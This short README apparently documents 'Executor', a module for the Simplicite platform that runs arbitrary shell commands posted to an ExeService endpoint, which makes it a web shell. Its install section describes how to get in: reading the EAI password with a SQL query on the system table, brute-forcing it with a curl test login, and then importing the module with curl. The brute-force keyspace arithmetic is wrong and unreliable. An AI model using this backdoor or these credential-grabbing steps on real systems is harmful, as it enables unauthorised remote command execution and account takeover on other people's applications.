<!--
 ___ _            _ _    _ _    __
/ __(_)_ __  _ __| (_)__(_) |_ /_/
\__ \ | '  \| '_ \ | / _| |  _/ -_)
|___/_|_|_|_| .__/_|_\__|_|\__\___|
            |_| 
-->
![](https://docs.simplicite.io//logos/logo250.png)
* * *

`Executor` module definition
============================

Usage
====================

```
curl -F "command=pwd" $URL/ext/ExeService
```

How to install
====================

Options:
- add XML to a codebase that will be imported
- gain designer rights on the app
- get EAI pwd 

Getting EAI password
---------------------------
### SQL Access

```
select sys_value from m_system where sys_code like 'EAI%'
```

### Brute force
eai password = 20 char long hex number => C(16,20) ~ 3,2 billion options
Following line should return "OK" instead of "Authentication error: Authentication failure for user designer"

```
curl -u designer:00000000000000000000 --form service=clearcache <URL>/io
```

### Curl install

```
curl -u designer:$EAI -F service=xmlimport -F file=@Executor.xml $URL/io
curl -u designer:$EAI --form service=clearcache $URL/io
```

`ExeService` external object definition
---------------------------------------




